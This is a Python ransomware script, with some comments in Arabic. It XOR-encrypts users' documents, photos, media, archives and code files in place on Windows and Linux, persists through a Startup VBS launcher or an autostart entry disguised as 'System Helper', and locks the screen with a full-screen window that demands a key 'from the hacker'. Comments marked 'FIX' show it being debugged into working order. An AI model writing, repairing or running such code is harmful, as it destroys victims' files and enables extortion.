#!/usr/bin/env python3
import os
import sys
import platform
import tkinter as tk
from tkinter import messagebox
import tempfile

# ================== الإعدادات ==================
KEY = "tHeD!wAsHere"
SCRIPT_NAME = "system_helper.py"

# FIX 1: Use a cross-platform temp directory for the lock file and log file
TEMP_DIR = tempfile.gettempdir()
LOCK_FILE = os.path.join(TEMP_DIR, ".ransomware_lock")
LOG_FILE  = os.path.join(TEMP_DIR, "ransomware_debug.log")

USER_EXTENSIONS = [
    '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
    '.txt', '.rtf', '.csv', '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff',
    '.mp3', '.wav', '.wma', '.aac', '.mp4', '.avi', '.mkv', '.mov', '.wmv',
    '.zip', '.rar', '.7z', '.tar', '.gz', '.html', '.htm', '.xml', '.json',
    '.py', '.java', '.cpp', '.c', '.js', '.exe', '.dll', '.deb', '.rpm'
]

IS_WINDOWS = platform.system() == 'Windows'
IS_LINUX   = platform.system() == 'Linux'

if IS_WINDOWS:
    def get_user_roots():
        # FIX 2: Target specific user directories instead of the whole C:\ drive
        roots = []
        user_profile = os.path.expanduser('~')
        for folder in ['Desktop', 'Documents', 'Downloads', 'Pictures', 'Music', 'Videos']:
            path = os.path.join(user_profile, folder)
            if os.path.exists(path):
                roots.append(path)
        return roots
    SKIP_DIRS = ['Windows', 'Program Files', 'Program Files (x86)', 'ProgramData',
                 '$Recycle.Bin', 'System Volume Information', 'Recovery', 'Boot', 'PerfLogs']
elif IS_LINUX:
    def get_user_roots():
        roots = ['/home', '/media', '/mnt']
        return [r for r in roots if os.path.exists(r)]
    SKIP_DIRS = ['/bin', '/boot', '/dev', '/etc', '/lib', '/lib64',
                 '/proc', '/run', '/sbin', '/sys', '/usr', '/var/lib', '/var/cache',
                 '/var/log', '/var/run', '/snap', '/lost+found']
else:
    print("Unsupported OS")
    sys.exit(1)

def xor_encrypt_decrypt(data, key):
    kb = key.encode()
    kl = len(kb)
    return bytes([data[i] ^ kb[i % kl] for i in range(len(data))])

# FIX 3: Safe logging function that won't crash the script
def safe_log(message):
    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as log:
            log.write(message + "\n")
    except Exception as e:
        # If logging fails, just print to console so the script doesn't die
        print(f"LOG FAILED: {message} | Error: {e}")

# معالجة ملف واحد مع تسجيل الأخطاء
def process_file(path, key):
    try:
        # Skip if file is too large (optional, to prevent memory issues)
        if os.path.getsize(path) > 100 * 1024 * 1024: # 100MB limit
            return False

        with open(path, 'rb') as f:
            content = f.read()
        
        new_content = xor_encrypt_decrypt(content, key)
        
        with open(path, 'wb') as f:
            f.write(new_content)
        return True
        
    except PermissionError:
        # FIX 4: Gracefully skip locked files (like Edge's domain_actions.dll)
        safe_log(f"SKIPPED (Permission Denied): {path}")
        return False
    except Exception as e:
        safe_log(f"FAILED {path}: {e}")
        return False

def should_skip_dir(dirpath):
    if IS_WINDOWS:
        parts = os.path.normpath(dirpath).split(os.sep)
        for part in parts:
            if part in SKIP_DIRS:
                return True
        return False
    else:
        for skip_dir in SKIP_DIRS:
            if dirpath.startswith(skip_dir):
                return True
        return False

def encrypt_all_user_data():
    total = 0
    for root_path in get_user_roots():
        for current_root, dirs, files in os.walk(root_path):
            if should_skip_dir(current_root):
                dirs[:] = []
                continue
            for file in files:
                if os.path.splitext(file)[1].lower() in USER_EXTENSIONS:
                    full = os.path.join(current_root, file)
                    if process_file(full, KEY):
                        total += 1
    safe_log(f"Processed {total} files.")

def decrypt_all_user_data():
    # نفس دالة التشفير لأن XOR متماثل
    encrypt_all_user_data()
    if os.path.exists(LOCK_FILE):
        try:
            os.remove(LOCK_FILE)
        except Exception as e:
            safe_log(f"Failed to remove lock file: {e}")

# ================== الثبات (Persistence) ==================
def get_persistence_path():
    if IS_WINDOWS:
        return os.path.join(os.getenv('APPDATA'), SCRIPT_NAME)
    else:
        return os.path.join(os.path.expanduser('~'), '.config', 'autostart', SCRIPT_NAME)

def add_to_startup():
    # FIX 5: Use absolute path to the current script
    current_script_path = os.path.abspath(sys.argv[0])
    
    if IS_WINDOWS:
        appdata = os.getenv('APPDATA')
        dest = os.path.join(appdata, SCRIPT_NAME)
        
        if not os.path.exists(dest):
            try:
                with open(current_script_path, 'rb') as src, open(dest, 'wb') as dst: 
                    dst.write(src.read())
            except Exception as e:
                safe_log(f"Failed to copy script to AppData: {e}")
                return

        startup = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        vbs = os.path.join(startup, 'sh.vbs')
        
        # Ensure pythonw path is correct
        pythonw = sys.executable.replace('python.exe', 'pythonw.exe')
        if not os.path.exists(pythonw):
            pythonw = sys.executable # Fallback to python.exe if pythonw doesn't exist
            
        try:
            with open(vbs, 'w') as f: 
                f.write(f'CreateObject("WScript.Shell").Run "{pythonw} ""{dest}""", 0, False')
        except Exception as e:
            safe_log(f"Failed to create VBS: {e}")
            
    else:
        home = os.path.expanduser('~')
        ad = os.path.join(home, '.config', 'autostart')
        os.makedirs(ad, exist_ok=True)
        dest = os.path.join(ad, SCRIPT_NAME)
        
        if not os.path.exists(dest):
            try:
                with open(current_script_path, 'rb') as src, open(dest, 'wb') as dst: 
                    dst.write(src.read())
                os.chmod(dest, 0o755)
            except Exception as e:
                safe_log(f"Failed to copy script to autostart: {e}")
                return

        desktop = f"""[Desktop Entry]
Type=Application
Name=System Helper
Exec=/usr/bin/python3 {dest}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
        try:
            with open(os.path.join(ad, 'system-helper.desktop'), 'w') as f: 
                f.write(desktop)
        except Exception as e:
            safe_log(f"Failed to create .desktop file: {e}")

def remove_from_startup():
    if IS_WINDOWS:
        appdata = os.getenv('APPDATA')
        for f in [os.path.join(appdata, SCRIPT_NAME)]:
            if os.path.exists(f): os.remove(f)
        vbs = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'sh.vbs')
        if os.path.exists(vbs): os.remove(vbs)
    else:
        home = os.path.expanduser('~')
        ad = os.path.join(home, '.config', 'autostart')
        for f in [os.path.join(ad, SCRIPT_NAME), os.path.join(ad, 'system-helper.desktop')]:
            if os.path.exists(f): os.remove(f)

# ================== الواجهة الرسومية ==================
def create_gui():
    root = tk.Tk()
    root.attributes('-fullscreen', True)
    root.attributes('-topmost', True)
    root.configure(bg='black')

    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.bind('<Alt-F4>', lambda e: 'break')

    label = tk.Label(root,
                     text="ur device hacked and encrypted to decrepit\n get the code form the hacker",
                     font=("Arial", 22, "bold"), fg="red", bg="black", justify="center")
    label.pack(expand=True, pady=40)

    entry_frame = tk.Frame(root, bg='black')
    entry_frame.pack(pady=30)

    entry = tk.Entry(entry_frame, font=("Arial", 18), width=30, show="*")
    entry.pack(side='left', padx=10)

    def check_key(event=None):
        if entry.get() == KEY:
            decrypt_all_user_data()
            remove_from_startup()
            messagebox.showinfo("OK", "Files restored. Exiting...")
            root.destroy()
            sys.exit(0)
        else:
            entry.delete(0, 'end')
            label.config(text="Wrong key! Try again...")

    submit_btn = tk.Button(entry_frame, text="Submit", font=("Arial", 16),
                           command=check_key, bg='gray')
    submit_btn.pack(side='left', padx=10)
    entry.bind('<Return>', check_key)

    root.after(200, lambda: (root.focus_force(), entry.focus_set()))
    root.bind('<Button-1>', lambda e: entry.focus_set())

    root.mainloop()

# ================== البداية ==================
if __name__ == '__main__':
    if os.path.exists(LOCK_FILE):
        create_gui()
        sys.exit(0)

    encrypt_all_user_data()
    add_to_startup()
    with open(LOCK_FILE, 'w') as f:
        f.write('locked')
    create_gui()
